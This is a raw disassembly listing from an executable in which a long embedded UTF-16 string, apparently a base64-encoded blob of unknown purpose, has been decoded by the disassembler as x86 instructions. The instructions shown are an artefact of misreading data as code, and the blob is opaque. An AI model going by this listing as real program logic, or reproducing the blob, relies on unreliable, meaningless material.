  40a04f:	00 65 00             	add    %ah,0x0(%ebp)
  40a052:	59                   	pop    %ecx
  40a053:	00 48 00             	add    %cl,0x0(%eax)
  40a056:	50                   	push   %eax
  40a057:	00 68 00             	add    %ch,0x0(%eax)
  40a05a:	78 00                	js     0x40a05c
  40a05c:	2b 00                	sub    (%eax),%eax
  40a05e:	44                   	inc    %esp
  40a05f:	00 42 00             	add    %al,0x0(%edx)
  40a062:	76 00                	jbe    0x40a064
  40a064:	57                   	push   %edi
  40a065:	00 6b 00             	add    %ch,0x0(%ebx)
  40a068:	35 00 32 00 4b       	xor    $0x4b003200,%eax
  40a06d:	00 77 00             	add    %dh,0x0(%edi)
  40a070:	4f                   	dec    %edi
  40a071:	00 4a 00             	add    %cl,0x0(%edx)
  40a074:	67 00 6c 00          	add    %ch,0x0(%si)
  40a078:	33 00                	xor    (%eax),%eax
  40a07a:	45                   	inc    %ebp
  40a07b:	00 69 00             	add    %ch,0x0(%ecx)
  40a07e:	30 00                	xor    %al,(%eax)
  40a080:	66 00 47 00          	data16 add %al,0x0(%edi)
  40a084:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40a088:	6c                   	insb   (%dx),%es:(%edi)
  40a089:	00 35 00 76 00 53    	add    %dh,0x53007600
  40a08f:	00 52 00             	add    %dl,0x0(%edx)
  40a092:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a096:	38 00                	cmp    %al,(%eax)
  40a098:	79 00                	jns    0x40a09a
  40a09a:	35 00 38 00 6c       	xor    $0x6c003800,%eax
  40a09f:	00 75 00             	add    %dh,0x0(%ebp)
  40a0a2:	34 00                	xor    $0x0,%al
  40a0a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0a5:	00 48 00             	add    %cl,0x0(%eax)
  40a0a8:	50                   	push   %eax
  40a0a9:	00 6f 00             	add    %ch,0x0(%edi)
  40a0ac:	6a 00                	push   $0x0
  40a0ae:	48                   	dec    %eax
  40a0af:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0b2:	6d                   	insl   (%dx),%es:(%edi)
  40a0b3:	00 66 00             	add    %ah,0x0(%esi)
  40a0b6:	30 00                	xor    %al,(%eax)
  40a0b8:	6c                   	insb   (%dx),%es:(%edi)
  40a0b9:	00 52 00             	add    %dl,0x0(%edx)
  40a0bc:	44                   	inc    %esp
  40a0bd:	00 71 00             	add    %dh,0x0(%ecx)
  40a0c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0c1:	00 33                	add    %dh,(%ebx)
  40a0c3:	00 38                	add    %bh,(%eax)
  40a0c5:	00 49 00             	add    %cl,0x0(%ecx)
  40a0c8:	48                   	dec    %eax
  40a0c9:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a0cd:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40a0d1:	00 4a 00             	add    %cl,0x0(%edx)
  40a0d4:	41                   	inc    %ecx
  40a0d5:	00 68 00             	add    %ch,0x0(%eax)
  40a0d8:	61                   	popa
  40a0d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a0dc:	42                   	inc    %edx
  40a0dd:	00 48 00             	add    %cl,0x0(%eax)
  40a0e0:	56                   	push   %esi
  40a0e1:	00 67 00             	add    %ah,0x0(%edi)
  40a0e4:	30 00                	xor    %al,(%eax)
  40a0e6:	50                   	push   %eax
  40a0e7:	00 78 00             	add    %bh,0x0(%eax)
  40a0ea:	72 00                	jb     0x40a0ec
  40a0ec:	79 00                	jns    0x40a0ee
  40a0ee:	5a                   	pop    %edx
  40a0ef:	00 57 00             	add    %dl,0x0(%edi)
  40a0f2:	57                   	push   %edi
  40a0f3:	00 78 00             	add    %bh,0x0(%eax)
  40a0f6:	51                   	push   %ecx
  40a0f7:	00 67 00             	add    %ah,0x0(%edi)
  40a0fa:	34 00                	xor    $0x0,%al
  40a0fc:	2f                   	das
  40a0fd:	00 69 00             	add    %ch,0x0(%ecx)
  40a100:	74 00                	je     0x40a102
  40a102:	32 00                	xor    (%eax),%al
  40a104:	4a                   	dec    %edx
  40a105:	00 50 00             	add    %dl,0x0(%eax)
  40a108:	6d                   	insl   (%dx),%es:(%edi)
  40a109:	00 79 00             	add    %bh,0x0(%ecx)
  40a10c:	58                   	pop    %eax
  40a10d:	00 2b                	add    %ch,(%ebx)
  40a10f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a112:	49                   	dec    %ecx
  40a113:	00 73 00             	add    %dh,0x0(%ebx)
  40a116:	33 00                	xor    (%eax),%eax
  40a118:	5a                   	pop    %edx
  40a119:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a11d:	00 39                	add    %bh,(%ecx)
  40a11f:	00 68 00             	add    %ch,0x0(%eax)
  40a122:	57                   	push   %edi
  40a123:	00 73 00             	add    %dh,0x0(%ebx)
  40a126:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40a12a:	38 00                	cmp    %al,(%eax)
  40a12c:	45                   	inc    %ebp
  40a12d:	00 47 00             	add    %al,0x0(%edi)
  40a130:	6d                   	insl   (%dx),%es:(%edi)
  40a131:	00 45 00             	add    %al,0x0(%ebp)
  40a134:	48                   	dec    %eax
  40a135:	00 55 00             	add    %dl,0x0(%ebp)
  40a138:	61                   	popa
  40a139:	00 71 00             	add    %dh,0x0(%ecx)
  40a13c:	78 00                	js     0x40a13e
  40a13e:	39 00                	cmp    %eax,(%eax)
  40a140:	62 00                	bound  %eax,(%eax)
  40a142:	78 00                	js     0x40a144
  40a144:	33 00                	xor    (%eax),%eax
  40a146:	35 00 49 00 30       	xor    $0x30004900,%eax
  40a14b:	00 7a 00             	add    %bh,0x0(%edx)
  40a14e:	79 00                	jns    0x40a150
  40a150:	34 00                	xor    $0x0,%al
  40a152:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40a156:	79 00                	jns    0x40a158
  40a158:	52                   	push   %edx
  40a159:	00 41 00             	add    %al,0x0(%ecx)
  40a15c:	4a                   	dec    %edx
  40a15d:	00 51 00             	add    %dl,0x0(%ecx)
  40a160:	57                   	push   %edi
  40a161:	00 49 00             	add    %cl,0x0(%ecx)
  40a164:	2f                   	das
  40a165:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a169:	00 4f 00             	add    %cl,0x0(%edi)
  40a16c:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a170:	49                   	dec    %ecx
  40a171:	00 70 00             	add    %dh,0x0(%eax)
  40a174:	2f                   	das
  40a175:	00 33                	add    %dh,(%ebx)
  40a177:	00 6d 00             	add    %ch,0x0(%ebp)
  40a17a:	63 00                	arpl   %eax,(%eax)
  40a17c:	6a 00                	push   $0x0
  40a17e:	32 00                	xor    (%eax),%al
  40a180:	69 00 78 00 78 00    	imul   $0x780078,(%eax),%eax
  40a186:	32 00                	xor    (%eax),%al
  40a188:	44                   	inc    %esp
  40a189:	00 45 00             	add    %al,0x0(%ebp)
  40a18c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a18d:	00 75 00             	add    %dh,0x0(%ebp)
  40a190:	6f                   	outsl  %ds:(%esi),(%dx)
  40a191:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40a195:	00 65 00             	add    %ah,0x0(%ebp)
  40a198:	52                   	push   %edx
  40a199:	00 69 00             	add    %ch,0x0(%ecx)
  40a19c:	51                   	push   %ecx
  40a19d:	00 55 00             	add    %dl,0x0(%ebp)
  40a1a0:	39 00                	cmp    %eax,(%eax)
  40a1a2:	77 00                	ja     0x40a1a4
  40a1a4:	38 00                	cmp    %al,(%eax)
  40a1a6:	63 00                	arpl   %eax,(%eax)
  40a1a8:	4a                   	dec    %edx
  40a1a9:	00 67 00             	add    %ah,0x0(%edi)
  40a1ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ad:	00 71 00             	add    %dh,0x0(%ecx)
  40a1b0:	2f                   	das
  40a1b1:	00 36                	add    %dh,(%esi)
  40a1b3:	00 53 00             	add    %dl,0x0(%ebx)
  40a1b6:	56                   	push   %esi
  40a1b7:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40a1bb:	00 31                	add    %dh,(%ecx)
  40a1bd:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a1c1:	00 75 00             	add    %dh,0x0(%ebp)
  40a1c4:	2f                   	das
  40a1c5:	00 66 00             	add    %ah,0x0(%esi)
  40a1c8:	71 00                	jno    0x40a1ca
  40a1ca:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40a1ce:	47                   	inc    %edi
  40a1cf:	00 6e 00             	add    %ch,0x0(%esi)
  40a1d2:	31 00                	xor    %eax,(%eax)
  40a1d4:	4b                   	dec    %ebx
  40a1d5:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40a1d9:	00 42 00             	add    %al,0x0(%edx)
  40a1dc:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a1e0:	2b 00                	sub    (%eax),%eax
  40a1e2:	6d                   	insl   (%dx),%es:(%edi)
  40a1e3:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40a1e7:	00 48 00             	add    %cl,0x0(%eax)
  40a1ea:	53                   	push   %ebx
  40a1eb:	00 38                	add    %bh,(%eax)
  40a1ed:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1f0:	4c                   	dec    %esp
  40a1f1:	00 71 00             	add    %dh,0x0(%ecx)
  40a1f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1f5:	00 37                	add    %dh,(%edi)
  40a1f7:	00 2f                	add    %ch,(%edi)
  40a1f9:	00 51 00             	add    %dl,0x0(%ecx)
  40a1fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1fd:	00 48 00             	add    %cl,0x0(%eax)
  40a200:	4f                   	dec    %edi
  40a201:	00 73 00             	add    %dh,0x0(%ebx)
  40a204:	54                   	push   %esp
  40a205:	00 47 00             	add    %al,0x0(%edi)
  40a208:	4a                   	dec    %edx
  40a209:	00 7a 00             	add    %bh,0x0(%edx)
  40a20c:	50                   	push   %eax
  40a20d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a210:	76 00                	jbe    0x40a212
  40a212:	37                   	aaa
  40a213:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a217:	00 32                	add    %dh,(%edx)
  40a219:	00 48 00             	add    %cl,0x0(%eax)
  40a21c:	66 00 54 00 39       	data16 add %dl,0x39(%eax,%eax,1)
  40a221:	00 6e 00             	add    %ch,0x0(%esi)
  40a224:	43                   	inc    %ebx
  40a225:	00 52 00             	add    %dl,0x0(%edx)
  40a228:	69 00 58 00 6c 00    	imul   $0x6c0058,(%eax),%eax
  40a22e:	48                   	dec    %eax
  40a22f:	00 43 00             	add    %al,0x0(%ebx)
  40a232:	67 00 76 00          	add    %dh,0x0(%bp)
  40a236:	46                   	inc    %esi
  40a237:	00 73 00             	add    %dh,0x0(%ebx)
  40a23a:	61                   	popa
  40a23b:	00 32                	add    %dh,(%edx)
  40a23d:	00 75 00             	add    %dh,0x0(%ebp)
  40a240:	34 00                	xor    $0x0,%al
  40a242:	63 00                	arpl   %eax,(%eax)
  40a244:	56                   	push   %esi
  40a245:	00 52 00             	add    %dl,0x0(%edx)
  40a248:	5a                   	pop    %edx
  40a249:	00 63 00             	add    %ah,0x0(%ebx)
  40a24c:	32 00                	xor    (%eax),%al
  40a24e:	69 00 70 00 2f 00    	imul   $0x2f0070,(%eax),%eax
  40a254:	34 00                	xor    $0x0,%al
  40a256:	7a 00                	jp     0x40a258
  40a258:	2f                   	das
  40a259:	00 38                	add    %bh,(%eax)
  40a25b:	00 51 00             	add    %dl,0x0(%ecx)
  40a25e:	78 00                	js     0x40a260
  40a260:	73 00                	jae    0x40a262
  40a262:	63 00                	arpl   %eax,(%eax)
  40a264:	37                   	aaa
  40a265:	00 4f 00             	add    %cl,0x0(%edi)
  40a268:	41                   	inc    %ecx
  40a269:	00 62 00             	add    %ah,0x0(%edx)
  40a26c:	32 00                	xor    (%eax),%al
  40a26e:	4f                   	dec    %edi
  40a26f:	00 7a 00             	add    %bh,0x0(%edx)
  40a272:	42                   	inc    %edx
  40a273:	00 43 00             	add    %al,0x0(%ebx)
  40a276:	41                   	inc    %ecx
  40a277:	00 30                	add    %dh,(%eax)
  40a279:	00 4b 00             	add    %cl,0x0(%ebx)
  40a27c:	4d                   	dec    %ebp
  40a27d:	00 70 00             	add    %dh,0x0(%eax)
  40a280:	73 00                	jae    0x40a282
  40a282:	6a 00                	push   $0x0
  40a284:	61                   	popa
  40a285:	00 61 00             	add    %ah,0x0(%ecx)
  40a288:	41                   	inc    %ecx
  40a289:	00 6f 00             	add    %ch,0x0(%edi)
  40a28c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a28d:	00 51 00             	add    %dl,0x0(%ecx)
  40a290:	4a                   	dec    %edx
  40a291:	00 43 00             	add    %al,0x0(%ebx)
  40a294:	4d                   	dec    %ebp
  40a295:	00 49 00             	add    %cl,0x0(%ecx)
  40a298:	38 00                	cmp    %al,(%eax)
  40a29a:	35 00 70 00 71       	xor    $0x71007000,%eax
  40a29f:	00 70 00             	add    %dh,0x0(%eax)
  40a2a2:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40a2a6:	53                   	push   %ebx
  40a2a7:	00 49 00             	add    %cl,0x0(%ecx)
  40a2aa:	62 00                	bound  %eax,(%eax)
  40a2ac:	53                   	push   %ebx
  40a2ad:	00 7a 00             	add    %bh,0x0(%edx)
  40a2b0:	42                   	inc    %edx
  40a2b1:	00 61 00             	add    %ah,0x0(%ecx)
  40a2b4:	62 00                	bound  %eax,(%eax)
  40a2b6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2b7:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40a2bb:	00 62 00             	add    %ah,0x0(%edx)
  40a2be:	52                   	push   %edx
  40a2bf:	00 39                	add    %bh,(%ecx)
  40a2c1:	00 56 00             	add    %dl,0x0(%esi)
  40a2c4:	4f                   	dec    %edi
  40a2c5:	00 71 00             	add    %dh,0x0(%ecx)
  40a2c8:	74 00                	je     0x40a2ca
  40a2ca:	55                   	push   %ebp
  40a2cb:	00 30                	add    %dh,(%eax)
  40a2cd:	00 58 00             	add    %bl,0x0(%eax)
  40a2d0:	7a 00                	jp     0x40a2d2
  40a2d2:	70 00                	jo     0x40a2d4
  40a2d4:	54                   	push   %esp
  40a2d5:	00 72 00             	add    %dh,0x0(%edx)
  40a2d8:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40a2dc:	52                   	push   %edx
  40a2dd:	00 4e 00             	add    %cl,0x0(%esi)
  40a2e0:	4d                   	dec    %ebp
  40a2e1:	00 53 00             	add    %dl,0x0(%ebx)
  40a2e4:	71 00                	jno    0x40a2e6
  40a2e6:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40a2ea:	4d                   	dec    %ebp
  40a2eb:	00 70 00             	add    %dh,0x0(%eax)
  40a2ee:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a2f2:	4d                   	dec    %ebp
  40a2f3:	00 62 00             	add    %ah,0x0(%edx)
  40a2f6:	78 00                	js     0x40a2f8
  40a2f8:	69 00 2b 00 66 00    	imul   $0x66002b,(%eax),%eax
  40a2fe:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a302:	56                   	push   %esi
  40a303:	00 50 00             	add    %dl,0x0(%eax)
  40a306:	75 00                	jne    0x40a308
  40a308:	6d                   	insl   (%dx),%es:(%edi)
  40a309:	00 31                	add    %dh,(%ecx)
  40a30b:	00 31                	add    %dh,(%ecx)
  40a30d:	00 6f 00             	add    %ch,0x0(%edi)
  40a310:	2f                   	das
  40a311:	00 4a 00             	add    %cl,0x0(%edx)
  40a314:	2b 00                	sub    (%eax),%eax
  40a316:	57                   	push   %edi
  40a317:	00 47 00             	add    %al,0x0(%edi)
  40a31a:	4b                   	dec    %ebx
  40a31b:	00 69 00             	add    %ch,0x0(%ecx)
  40a31e:	63 00                	arpl   %eax,(%eax)
  40a320:	33 00                	xor    (%eax),%eax
  40a322:	46                   	inc    %esi
  40a323:	00 31                	add    %dh,(%ecx)
  40a325:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a329:	00 72 00             	add    %dh,0x0(%edx)
  40a32c:	6b 00 47             	imul   $0x47,(%eax),%eax
  40a32f:	00 55 00             	add    %dl,0x0(%ebp)
  40a332:	6f                   	outsl  %ds:(%esi),(%dx)
  40a333:	00 42 00             	add    %al,0x0(%edx)
  40a336:	41                   	inc    %ecx
  40a337:	00 35 00 56 00 70    	add    %dh,0x70005600
  40a33d:	00 59 00             	add    %bl,0x0(%ecx)
  40a340:	44                   	inc    %esp
  40a341:	00 50 00             	add    %dl,0x0(%eax)
  40a344:	2b 00                	sub    (%eax),%eax
  40a346:	71 00                	jno    0x40a348
  40a348:	49                   	dec    %ecx
  40a349:	00 4f 00             	add    %cl,0x0(%edi)
  40a34c:	5a                   	pop    %edx
  40a34d:	00 35 00 63 00 37    	add    %dh,0x37006300
  40a353:	00 4a 00             	add    %cl,0x0(%edx)
  40a356:	48                   	dec    %eax
  40a357:	00 4f 00             	add    %cl,0x0(%edi)
  40a35a:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40a35d:	00 71 00             	add    %dh,0x0(%ecx)
  40a360:	6a 00                	push   $0x0
  40a362:	39 00                	cmp    %eax,(%eax)
  40a364:	47                   	inc    %edi
  40a365:	00 6a 00             	add    %ch,0x0(%edx)
  40a368:	7a 00                	jp     0x40a36a
  40a36a:	55                   	push   %ebp
  40a36b:	00 38                	add    %bh,(%eax)
  40a36d:	00 77 00             	add    %dh,0x0(%edi)
  40a370:	55                   	push   %ebp
  40a371:	00 61 00             	add    %ah,0x0(%ecx)
  40a374:	79 00                	jns    0x40a376
  40a376:	77 00                	ja     0x40a378
  40a378:	54                   	push   %esp
  40a379:	00 6f 00             	add    %ch,0x0(%edi)
  40a37c:	75 00                	jne    0x40a37e
  40a37e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a37f:	00 42 00             	add    %al,0x0(%edx)
  40a382:	32 00                	xor    (%eax),%al
  40a384:	56                   	push   %esi
  40a385:	00 45 00             	add    %al,0x0(%ebp)
  40a388:	34 00                	xor    $0x0,%al
  40a38a:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40a38e:	51                   	push   %ecx
  40a38f:	00 37                	add    %dh,(%edi)
  40a391:	00 36                	add    %dh,(%esi)
  40a393:	00 41 00             	add    %al,0x0(%ecx)
  40a396:	42                   	inc    %edx
  40a397:	00 32                	add    %dh,(%edx)
  40a399:	00 35 00 75 00 6a    	add    %dh,0x6a007500
  40a39f:	00 39                	add    %bh,(%ecx)
  40a3a1:	00 32                	add    %dh,(%edx)
  40a3a3:	00 47 00             	add    %al,0x0(%edi)
  40a3a6:	4a                   	dec    %edx
  40a3a7:	00 55 00             	add    %dl,0x0(%ebp)
  40a3aa:	78 00                	js     0x40a3ac
  40a3ac:	79 00                	jns    0x40a3ae
  40a3ae:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a3b2:	72 00                	jb     0x40a3b4
  40a3b4:	49                   	dec    %ecx
  40a3b5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3b8:	34 00                	xor    $0x0,%al
  40a3ba:	30 00                	xor    %al,(%eax)
  40a3bc:	71 00                	jno    0x40a3be
  40a3be:	63 00                	arpl   %eax,(%eax)
  40a3c0:	65 00 6c 00 71       	add    %ch,%gs:0x71(%eax,%eax,1)
  40a3c5:	00 75 00             	add    %dh,0x0(%ebp)
  40a3c8:	2b 00                	sub    (%eax),%eax
  40a3ca:	7a 00                	jp     0x40a3cc
  40a3cc:	63 00                	arpl   %eax,(%eax)
  40a3ce:	39 00                	cmp    %eax,(%eax)
  40a3d0:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40a3d4:	61                   	popa
  40a3d5:	00 41 00             	add    %al,0x0(%ecx)
  40a3d8:	43                   	inc    %ebx
  40a3d9:	00 72 00             	add    %dh,0x0(%edx)
  40a3dc:	33 00                	xor    (%eax),%eax
  40a3de:	35 00 52 00 7a       	xor    $0x7a005200,%eax
  40a3e3:	00 75 00             	add    %dh,0x0(%ebp)
  40a3e6:	37                   	aaa
  40a3e7:	00 51 00             	add    %dl,0x0(%ecx)
  40a3ea:	6c                   	insb   (%dx),%es:(%edi)
  40a3eb:	00 37                	add    %dh,(%edi)
  40a3ed:	00 78 00             	add    %bh,0x0(%eax)
  40a3f0:	4b                   	dec    %ebx
  40a3f1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3f4:	71 00                	jno    0x40a3f6
  40a3f6:	37                   	aaa
  40a3f7:	00 73 00             	add    %dh,0x0(%ebx)
  40a3fa:	58                   	pop    %eax
  40a3fb:	00 2f                	add    %ch,(%edi)
  40a3fd:	00 57 00             	add    %dl,0x0(%edi)
  40a400:	74 00                	je     0x40a402
  40a402:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a405:	00 61 00             	add    %ah,0x0(%ecx)
  40a408:	51                   	push   %ecx
  40a409:	00 70 00             	add    %dh,0x0(%eax)
  40a40c:	59                   	pop    %ecx
  40a40d:	00 48 00             	add    %cl,0x0(%eax)
  40a410:	6a 00                	push   $0x0
  40a412:	41                   	inc    %ecx
  40a413:	00 2f                	add    %ch,(%edi)
  40a415:	00 67 00             	add    %ah,0x0(%edi)
  40a418:	2f                   	das
  40a419:	00 4a 00             	add    %cl,0x0(%edx)
  40a41c:	6c                   	insb   (%dx),%es:(%edi)
  40a41d:	00 37                	add    %dh,(%edi)
  40a41f:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40a423:	00 67 00             	add    %ah,0x0(%edi)
  40a426:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a429:	00 79 00             	add    %bh,0x0(%ecx)
  40a42c:	41                   	inc    %ecx
  40a42d:	00 36                	add    %dh,(%esi)
  40a42f:	00 5a 00             	add    %bl,0x0(%edx)
  40a432:	34 00                	xor    $0x0,%al
  40a434:	51                   	push   %ecx
  40a435:	00 79 00             	add    %bh,0x0(%ecx)
  40a438:	71 00                	jno    0x40a43a
  40a43a:	61                   	popa
  40a43b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a43e:	61                   	popa
  40a43f:	00 50 00             	add    %dl,0x0(%eax)
  40a442:	6f                   	outsl  %ds:(%esi),(%dx)
  40a443:	00 2f                	add    %ch,(%edi)
  40a445:	00 42 00             	add    %al,0x0(%edx)
  40a448:	6e                   	outsb  %ds:(%esi),(%dx)
  40a449:	00 4b 00             	add    %cl,0x0(%ebx)
  40a44c:	48                   	dec    %eax
  40a44d:	00 67 00             	add    %ah,0x0(%edi)
  40a450:	38 00                	cmp    %al,(%eax)
  40a452:	6c                   	insb   (%dx),%es:(%edi)
  40a453:	00 6b 00             	add    %ch,0x0(%ebx)
  40a456:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40a45a:	4a                   	dec    %edx
  40a45b:	00 75 00             	add    %dh,0x0(%ebp)
  40a45e:	76 00                	jbe    0x40a460
  40a460:	49                   	dec    %ecx
  40a461:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a464:	67 00 38             	add    %bh,(%bx,%si)
  40a467:	00 79 00             	add    %bh,0x0(%ecx)
  40a46a:	76 00                	jbe    0x40a46c
  40a46c:	56                   	push   %esi
  40a46d:	00 57 00             	add    %dl,0x0(%edi)
  40a470:	49                   	dec    %ecx
  40a471:	00 4a 00             	add    %cl,0x0(%edx)
  40a474:	69 00 4a 00 63 00    	imul   $0x63004a,(%eax),%eax
  40a47a:	4c                   	dec    %esp
  40a47b:	00 49 00             	add    %cl,0x0(%ecx)
  40a47e:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a482:	32 00                	xor    (%eax),%al
  40a484:	2f                   	das
  40a485:	00 4f 00             	add    %cl,0x0(%edi)
  40a488:	78 00                	js     0x40a48a
  40a48a:	32 00                	xor    (%eax),%al
  40a48c:	76 00                	jbe    0x40a48e
  40a48e:	6a 00                	push   $0x0
  40a490:	77 00                	ja     0x40a492
  40a492:	43                   	inc    %ebx
  40a493:	00 53 00             	add    %dl,0x0(%ebx)
  40a496:	4b                   	dec    %ebx
  40a497:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40a49b:	00 62 00             	add    %ah,0x0(%edx)
  40a49e:	45                   	inc    %ebp
  40a49f:	00 65 00             	add    %ah,0x0(%ebp)
  40a4a2:	43                   	inc    %ebx
  40a4a3:	00 55 00             	add    %dl,0x0(%ebp)
  40a4a6:	6d                   	insl   (%dx),%es:(%edi)
  40a4a7:	00 49 00             	add    %cl,0x0(%ecx)
  40a4aa:	73 00                	jae    0x40a4ac
  40a4ac:	74 00                	je     0x40a4ae
  40a4ae:	6a 00                	push   $0x0
  40a4b0:	49                   	dec    %ecx
  40a4b1:	00 61 00             	add    %ah,0x0(%ecx)
  40a4b4:	4d                   	dec    %ebp
  40a4b5:	00 35 00 67 00 4c    	add    %dh,0x4c006700
  40a4bb:	00 39                	add    %bh,(%ecx)
  40a4bd:	00 57 00             	add    %dl,0x0(%edi)
  40a4c0:	69 00 6e 00 47 00    	imul   $0x47006e,(%eax),%eax
  40a4c6:	42                   	inc    %edx
  40a4c7:	00 71 00             	add    %dh,0x0(%ecx)
  40a4ca:	61                   	popa
  40a4cb:	00 36                	add    %dh,(%esi)
  40a4cd:	00 55 00             	add    %dl,0x0(%ebp)
  40a4d0:	52                   	push   %edx
  40a4d1:	00 45 00             	add    %al,0x0(%ebp)
  40a4d4:	41                   	inc    %ecx
  40a4d5:	00 63 00             	add    %ah,0x0(%ebx)
  40a4d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4d9:	00 43 00             	add    %al,0x0(%ebx)
  40a4dc:	45                   	inc    %ebp
  40a4dd:	00 65 00             	add    %ah,0x0(%ebp)
  40a4e0:	37                   	aaa
  40a4e1:	00 73 00             	add    %dh,0x0(%ebx)
  40a4e4:	36 00 30             	add    %dh,%ss:(%eax)
  40a4e7:	00 30                	add    %dh,(%eax)
  40a4e9:	00 36                	add    %dh,(%esi)
  40a4eb:	00 32                	add    %dh,(%edx)
  40a4ed:	00 76 00             	add    %dh,0x0(%esi)
  40a4f0:	6a 00                	push   $0x0
  40a4f2:	42                   	inc    %edx
  40a4f3:	00 2f                	add    %ch,(%edi)
  40a4f5:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40a4f9:	00 68 00             	add    %ch,0x0(%eax)
  40a4fc:	2b 00                	sub    (%eax),%eax
  40a4fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4ff:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40a503:	00 63 00             	add    %ah,0x0(%ebx)
  40a506:	43                   	inc    %ebx
  40a507:	00 45 00             	add    %al,0x0(%ebp)
  40a50a:	53                   	push   %ebx
  40a50b:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40a50f:	00 61 00             	add    %ah,0x0(%ecx)
  40a512:	35 00 56 00 77       	xor    $0x77005600,%eax
  40a517:	00 69 00             	add    %ch,0x0(%ecx)
  40a51a:	51                   	push   %ecx
  40a51b:	00 7a 00             	add    %bh,0x0(%edx)
  40a51e:	63 00                	arpl   %eax,(%eax)
  40a520:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40a524:	44                   	inc    %esp
  40a525:	00 75 00             	add    %dh,0x0(%ebp)
  40a528:	70 00                	jo     0x40a52a
  40a52a:	72 00                	jb     0x40a52c
  40a52c:	62 00                	bound  %eax,(%eax)
  40a52e:	39 00                	cmp    %eax,(%eax)
  40a530:	68 00 44 00 2f       	push   $0x2f004400
  40a535:	00 68 00             	add    %ch,0x0(%eax)
  40a538:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a53c:	76 00                	jbe    0x40a53e
  40a53e:	4b                   	dec    %ebx
  40a53f:	00 78 00             	add    %bh,0x0(%eax)
  40a542:	57                   	push   %edi
  40a543:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  40a547:	00 30                	add    %dh,(%eax)
  40a549:	00 6e 00             	add    %ch,0x0(%esi)
  40a54c:	47                   	inc    %edi
  40a54d:	00 41 00             	add    %al,0x0(%ecx)
  40a550:	57                   	push   %edi
  40a551:	00 66 00             	add    %ah,0x0(%esi)
  40a554:	69 00 43 00 64 00    	imul   $0x640043,(%eax),%eax
  40a55a:	51                   	push   %ecx
  40a55b:	00 6a 00             	add    %ch,0x0(%edx)
  40a55e:	30 00                	xor    %al,(%eax)
  40a560:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a564:	6f                   	outsl  %ds:(%esi),(%dx)
  40a565:	00 6d 00             	add    %ch,0x0(%ebp)
  40a568:	51                   	push   %ecx
  40a569:	00 4d 00             	add    %cl,0x0(%ebp)
  40a56c:	6b 00 62             	imul   $0x62,(%eax),%eax
  40a56f:	00 46 00             	add    %al,0x0(%esi)
  40a572:	54                   	push   %esp
  40a573:	00 53 00             	add    %dl,0x0(%ebx)
  40a576:	72 00                	jb     0x40a578
  40a578:	73 00                	jae    0x40a57a
  40a57a:	6a 00                	push   $0x0
  40a57c:	34 00                	xor    $0x0,%al
  40a57e:	62 00                	bound  %eax,(%eax)
  40a580:	31 00                	xor    %eax,(%eax)
  40a582:	50                   	push   %eax
  40a583:	00 68 00             	add    %ch,0x0(%eax)
  40a586:	68 00 52 00 63       	push   $0x63005200
  40a58b:	00 4e 00             	add    %cl,0x0(%esi)
  40a58e:	69 00 74 00 4c 00    	imul   $0x4c0074,(%eax),%eax
  40a594:	63 00                	arpl   %eax,(%eax)
  40a596:	6a 00                	push   $0x0
  40a598:	75 00                	jne    0x40a59a
